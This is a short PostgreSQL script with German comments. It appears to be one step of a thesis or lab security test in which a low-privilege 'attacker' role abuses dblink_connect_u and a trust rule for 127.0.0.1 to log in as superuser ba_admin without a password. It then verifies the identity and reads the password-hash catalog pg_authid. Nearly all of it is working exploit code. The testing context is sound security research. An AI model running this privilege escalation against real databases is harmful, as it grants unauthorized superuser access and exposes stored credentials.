\echo '## E1  dblink Selbst-Connect auf localhost  (als attacker, in ba_test)'
-- ueber dblink_connect_u die Passwortpflicht umgehen und ueber die
-- trust-Zeile fuer 127.0.0.1 als Superuser ba_admin ankommen
SELECT dblink_connect_u('c', 'host=127.0.0.1 port=5432 dbname=ba_test user=ba_admin');
-- Beleg der Identitaet an der Gegenstelle
SELECT * FROM dblink('c', 'SELECT current_user') AS t(angemeldet_als text);
-- was das eroeffnet: Lesen aus pg_authid, das nur der Superuser darf
SELECT * FROM dblink('c', 'SELECT count(*) FROM pg_authid') AS t(authid_zeilen bigint);
SELECT dblink_disconnect('c');